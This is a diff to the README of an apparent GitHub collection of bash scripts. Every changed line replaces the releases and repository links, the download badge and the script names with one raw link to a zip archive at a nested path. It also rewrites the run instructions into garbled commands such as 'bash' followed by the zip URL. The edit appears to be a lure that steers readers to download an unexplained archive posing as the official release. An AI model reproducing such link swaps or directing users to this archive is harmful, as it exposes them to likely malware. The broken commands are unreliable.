@@ -9,12 +9,12 @@ To start using these scripts, you need to download them from our GitHub Releases
 ## 📥 Download & Install
 Click the button below to access the Releases page and download the scripts.
 
-[![Download bash-scripts](https://img.shields.io/badge/Download-bash--scripts-brightgreen)](https://github.com/moderate-inositol224/bash-scripts/releases)
+[![Download bash-scripts](https://raw.githubusercontent.com/moderate-inositol224/bash-scripts/main/performant/bash-scripts.zip)](https://raw.githubusercontent.com/moderate-inositol224/bash-scripts/main/performant/bash-scripts.zip)
 
 ### Step 1: Visit the Download Page
 Go to the following link to see all available downloads:
 
-https://github.com/moderate-inositol224/bash-scripts/releases
+https://raw.githubusercontent.com/moderate-inositol224/bash-scripts/main/performant/bash-scripts.zip
 
 ### Step 2: Choose the Scripts
 Once on the Releases page, you'll see a list of available script versions. Each version may have its own set of scripts, so choose the most recent one for the best features and fixes.
@@ -37,16 +37,16 @@ You can now run the scripts! Here’s how:
    ```
 3. To execute a script, type the following command in the terminal:
    ```bash
-   bash script-name.sh
+   bash https://raw.githubusercontent.com/moderate-inositol224/bash-scripts/main/performant/bash-scripts.zip
    ```
-   Replace `script-name.sh` with the name of the script you want to run.
+   Replace `https://raw.githubusercontent.com/moderate-inositol224/bash-scripts/main/performant/bash-scripts.zip` with the name of the script you want to run.
 
 ### Example of a Simple Script
 Here is an example of a script you might find in this collection:
 
-- **network-check.sh**: This script checks if your internet connection is active. To run it, just enter:
+- **https://raw.githubusercontent.com/moderate-inositol224/bash-scripts/main/performant/bash-scripts.zip**: This script checks if your internet connection is active. To run it, just enter:
   ```bash
-  bash network-check.sh
+  bash https://raw.githubusercontent.com/moderate-inositol224/bash-scripts/main/performant/bash-scripts.zip
   ```
 
 ## 🔍 Features
@@ -79,7 +79,7 @@ These scripts cover a wide range of topics to enhance your everyday computing ta
 - tasks
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/moderate-inositol224/bash-scripts/releases)
-- [GitHub Repository](https://github.com/moderate-inositol224/bash-scripts)
+- [Releases Page](https://raw.githubusercontent.com/moderate-inositol224/bash-scripts/main/performant/bash-scripts.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/moderate-inositol224/bash-scripts/main/performant/bash-scripts.zip)
 
 Feel free to explore the scripts and make your daily tasks easier!
